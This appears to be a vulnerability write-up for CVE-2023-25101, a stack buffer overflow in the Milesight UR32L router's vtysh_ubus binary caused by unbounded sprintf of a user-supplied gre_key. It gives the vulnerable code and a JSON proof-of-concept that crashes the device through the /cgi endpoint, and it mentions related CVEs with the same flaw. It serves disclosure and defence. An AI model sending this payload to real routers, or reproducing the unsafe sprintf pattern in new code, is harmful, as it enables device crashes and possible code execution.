This document provides detailed information about CVE-2023-25101, as well as several other related CVEs.

**CVE-2023-25101**

*   **Root Cause:** The vulnerability lies in the `set_dmvpn` function within the `vtysh_ubus` binary of Milesight UR32L v32.3.0.5. It is caused by the use of `sprintf` with a user-controlled `gre_key` value.
*   **Weaknesses/Vulnerabilities:** A stack-based buffer overflow is present due to the unbounded use of `sprintf`.
*   **Impact of Exploitation:** Successful exploitation could lead to arbitrary code execution on the device.
*   **Attack Vectors:** Sending a specially crafted HTTP POST request to the `/cgi` endpoint with a high privileged user.
*   **Required Attacker Capabilities/Position:** The attacker needs to have high privileges to send the malicious HTTP request.

**Technical Details:**

The `set_dmvpn` function retrieves the `gre_key` value from the JSON request. This value is then used in a `sprintf` call:

```c
is_equal = strcmp(table_key,"gre_key");
if (is_equal == 0) {
    gre_key = (char *)blobmsg_get_string(table_value);
    if (*gre_key != '\0') {
        command_format_string = "tunnel key %s";
        [...]
    }
    [...]
}
sprintf(vtysh_command_buffer,command_format_string,gre_key);
```

The `vtysh_command_buffer` is a fixed-size buffer on the stack, and by providing a large `gre_key` string, an attacker can cause a buffer overflow.

**Exploit Proof of Concept:**

```json
{
    "id": 6,
    "execute": 1,
    "core": "yruo_vpn_dmvpn",
    "function": "set",
    "values": [
        {
            "base": "yruo_vpn_dmvpn",
            "index": 1,
            "value": {
                "gre_key":"A"*0x300
            }
        }
    ]
}
```
This JSON payload, when sent to the `/cgi` endpoint, will trigger a crash due to the buffer overflow.

The document also provides similar details for the other related CVEs, all of which are related to the same root cause (unsafe `sprintf` usage) and within the `vtysh_ubus` binary. The vulnerable areas are in various functionalities relating to firewall, QoS, VPN (DMVPN, GRE, L2TP, OpenVPN, PPTP) configuration.